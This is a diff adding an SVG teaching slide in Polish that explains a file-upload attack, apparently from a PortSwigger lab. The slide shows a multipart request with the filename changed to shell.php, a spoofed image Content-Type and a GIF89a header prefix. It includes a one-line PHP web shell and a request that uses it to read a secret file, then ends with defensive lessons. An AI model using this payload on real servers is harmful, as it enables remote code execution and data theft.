@@ -1,0 +1,65 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1920" height="1080" viewBox="0 0 1920 1080">
+  <defs>
+    <linearGradient id="bg" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" style="stop-color:#f8fbff"/>
+      <stop offset="100%" style="stop-color:#fff5f8"/>
+    </linearGradient>
+  </defs>
+  <rect width="1920" height="1080" fill="url(#bg)"/>
+  <rect x="60" y="40" width="1800" height="120" rx="16" fill="#1e3a5f"/>
+  <text x="960" y="95" text-anchor="middle" fill="#fff" font-family="system-ui,Segoe UI,sans-serif" font-size="42" font-weight="700">Od family.jpg do shell.php — jeden łańcuch (body HTTP)</text>
+  <text x="960" y="130" text-anchor="middle" fill="#b8d4f0" font-family="system-ui,sans-serif" font-size="22">Serwer nie „konwertuje” JPG → PHP. Zapisuje nazwę i bajty z żądania multipart.</text>
+
+  <!-- Step 1 -->
+  <rect x="80" y="190" width="400" height="200" rx="12" fill="#e8f4fc" stroke="#3d7ab8" stroke-width="2"/>
+  <text x="280" y="230" text-anchor="middle" fill="#1e3a5f" font-size="26" font-weight="700">① Użytkownik w UI</text>
+  <text x="280" y="270" text-anchor="middle" fill="#333" font-size="20">Wybiera: family.jpg</text>
+  <text x="280" y="305" text-anchor="middle" fill="#333" font-size="18">Klika „Upload”</text>
+  <text x="280" y="350" text-anchor="middle" fill="#666" font-size="16">To tylko wybór lokalny —</text>
+  <text x="280" y="375" text-anchor="middle" fill="#666" font-size="16">nie gwarantuje nazwy na serwerze</text>
+
+  <path d="M 490 290 L 560 290" stroke="#1e3a5f" stroke-width="3" marker-end="url(#arr)"/>
+  <defs><marker id="arr" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><polygon points="0 0, 10 3, 0 6" fill="#1e3a5f"/></marker></defs>
+
+  <!-- Step 2 body -->
+  <rect x="570" y="170" width="780" height="420" rx="12" fill="#1a1a2e" stroke="#e94560" stroke-width="3"/>
+  <text x="590" y="210" fill="#ff6b8a" font-family="ui-monospace,monospace" font-size="22" font-weight="700">② POST multipart — to wysyła Burp / przeglądarka</text>
+  <text x="590" y="250" fill="#a8e6cf" font-family="ui-monospace,monospace" font-size="18">POST /my-account/avatar HTTP/1.1</text>
+  <text x="590" y="280" fill="#a8e6cf" font-family="ui-monospace,monospace" font-size="18">Content-Type: multipart/form-data; boundary=----x</text>
+  <text x="590" y="320" fill="#888" font-family="ui-monospace,monospace" font-size="16">------x</text>
+  <text x="590" y="345" fill="#ffd93d" font-family="ui-monospace,monospace" font-size="17">Content-Disposition: form-data; name="avatar"; filename="shell.php"</text>
+  <text x="1050" y="345" fill="#ff6b8a" font-size="15">← zmiana w Burp (było family.jpg)</text>
+  <text x="590" y="375" fill="#ffd93d" font-family="ui-monospace,monospace" font-size="17">Content-Type: image/jpeg</text>
+  <text x="950" y="375" fill="#ff6b8a" font-size="15">← może być sfałszowane</text>
+  <text x="590" y="405" fill="#888" font-family="ui-monospace,monospace" font-size="16">(pusta linia = początek body)</text>
+  <text x="590" y="435" fill="#fff" font-family="ui-monospace,monospace" font-size="17">GIF89a;</text>
+  <text x="680" y="435" fill="#888" font-size="14">opcjonalnie — oszukanie skanu „magic bytes”</text>
+  <text x="590" y="470" fill="#ff9f43" font-family="ui-monospace,monospace" font-size="17">&lt;?php system($_GET['cmd']); ?&gt;</text>
+  <text x="900" y="470" fill="#ff6b8a" font-size="14">← prawdziwa treść (nie tylko piksele)</text>
+  <text x="590" y="510" fill="#888" font-family="ui-monospace,monospace" font-size="16">------x--</text>
+  <rect x="590" y="530" width="740" height="48" rx="8" fill="#2d3436"/>
+  <text x="600" y="560" fill="#dfe6e9" font-size="16">Zmieniane: filename | Content-Type | bajty w body (nagłówek GIF + kod PHP)</text>
+
+  <path d="M 1360 380 L 1430 380" stroke="#1e3a5f" stroke-width="3"/>
+
+  <!-- Step 3 -->
+  <rect x="1440" y="190" width="400" height="200" rx="12" fill="#fff3cd" stroke="#e0a800" stroke-width="2"/>
+  <text x="1640" y="230" text-anchor="middle" fill="#1e3a5f" font-size="26" font-weight="700">③ Zapis na serwerze</text>
+  <text x="1640" y="275" text-anchor="middle" fill="#333" font-size="19">/uploads/shell.php</text>
+  <text x="1640" y="310" text-anchor="middle" fill="#333" font-size="17">Nazwa z Content-Disposition</text>
+  <text x="1640" y="340" text-anchor="middle" fill="#c0392b" font-size="16" font-weight="600">Nie ma konwersji jpg → php</text>
+  <text x="1640" y="370" text-anchor="middle" fill="#666" font-size="15">Treść = bajty z body</text>
+
+  <path d="M 1640 400 L 1640 460" stroke="#1e3a5f" stroke-width="3"/>
+
+  <!-- Step 4 -->
+  <rect x="570" y="620" width="780" height="180" rx="12" fill="#d4edda" stroke="#28a745" stroke-width="2"/>
+  <text x="960" y="665" text-anchor="middle" fill="#1e3a5f" font-size="26" font-weight="700">④ Wykonanie (PHP + Apache)</text>
+  <text x="960" y="710" text-anchor="middle" fill="#333" font-family="ui-monospace,monospace" font-size="20">GET /uploads/shell.php?cmd=cat /home/carlos/secret</text>
+  <text x="960" y="750" text-anchor="middle" fill="#333" font-size="19">mod_php uruchamia kod — to nie podgląd zdjęcia</text>
+  <text x="960" y="785" text-anchor="middle" fill="#c0392b" font-size="18" font-weight="600">Skutek: web shell / RCE (np. lab PortSwigger)</text>
+
+  <rect x="80" y="860" width="1760" height="90" rx="12" fill="#ffc107"/>
+  <text x="960" y="905" text-anchor="middle" fill="#1e3a5f" font-size="22" font-weight="700">Lekcja: ufaj allow-liście rozszerzeń, losowej nazwie, brakowi PHP w uploads — nie samemu Content-Type z klienta.</text>
+  <text x="960" y="935" text-anchor="middle" fill="#333" font-size="18">Wasz lab Node: upload nie jest wykonywany — ten slajd dotyczy stacku PHP.</text>
+</svg>
